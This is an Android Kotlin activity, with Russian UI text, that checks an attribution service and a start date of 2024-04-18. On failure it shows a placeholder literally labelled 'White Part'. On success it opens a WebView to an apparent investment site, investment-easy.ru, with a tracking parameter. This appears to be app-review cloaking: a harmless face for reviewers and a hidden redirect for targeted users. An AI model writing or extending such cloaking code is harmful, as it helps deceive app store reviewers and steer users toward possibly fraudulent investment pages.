package custom.lib.droid.appsflyerextension

import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.annotation.RequiresApi
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.height
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.unit.dp
import custom.lib.droid.appsflyerextension.ui.theme.AppsflyerExtensionTheme
import custom.lib.droid.flyer_extension.FlyerExtension
import custom.lib.droid.flyer_extension.isNDaysPassed
import custom.web.view.compose.UserWebView
import java.time.LocalDate


class MainActivity : ComponentActivity() {

    var text by mutableStateOf("")

    var status by mutableStateOf(StatusApp.LOADING)
    var utm by mutableStateOf("")
    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.e("TAG", "onCreate: ${isNDaysPassed(startDate = LocalDate.of(2024, 4, 21), 3)}")
        Log.e("TAG", "onCreate: ${isNDaysPassed(startDate = LocalDate.of(2024, 4, 15), 4)}")

        FlyerExtension.setExtension(
            value = "i76DHWyqpCeUdgbXaj9XmL",
            context = applicationContext,
            onError = {
                Log.e("TAG", "onCreate: failed")
                status = StatusApp.FAIL
            },
            onSuccess = {
                utm = it.content!!
                status = StatusApp.SUCCESS
                Log.e("TAG", "onCreate: success ${it.content}")
            },
            startDate = LocalDate.of(2024, 4, 18)
        )

        setContent {


            AppsflyerExtensionTheme {
                // A surface container using the 'background' color from the theme
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {

                    when (status) {
                        StatusApp.LOADING -> Loader()
                        StatusApp.FAIL -> Text(text = "White Part")
                        StatusApp.SUCCESS -> UserWebView(data = "https://investment-easy.ru/LNB8P1$utm")
                    }
                }
            }
        }
    }
}


enum class StatusApp {
    LOADING, SUCCESS, FAIL
}

@Composable
fun Loader() {

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(MaterialTheme.colorScheme.background),
        contentAlignment = Alignment.Center,
    ) {
        Column(
            modifier = Modifier.fillMaxSize(),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center,
        ) {
            CircularProgressIndicator()
            Spacer(modifier = Modifier.height(30.dp))
            Text("Добро пожаловать в ${stringResource(id = R.string.app_name)}")
            Text("Идет загрузка материала", color = Color.Gray.copy(.7f))

        }
    }

}



